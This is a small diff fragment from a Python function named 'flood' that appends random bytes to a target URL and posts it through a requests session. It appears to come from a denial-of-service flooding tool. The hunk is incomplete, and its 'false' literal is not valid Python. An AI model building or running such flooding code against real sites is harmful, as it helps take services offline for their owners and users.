@@ -32,7 +32,6 @@ def flood(target,domainname,attack,sock):
     payload = str(random._urandom(random.randint(10, 150)))
     datapost= {
     "url": target+'?'+payload,
-    "requestScreenshot": false,
     }
     s = requests.Session()
 	
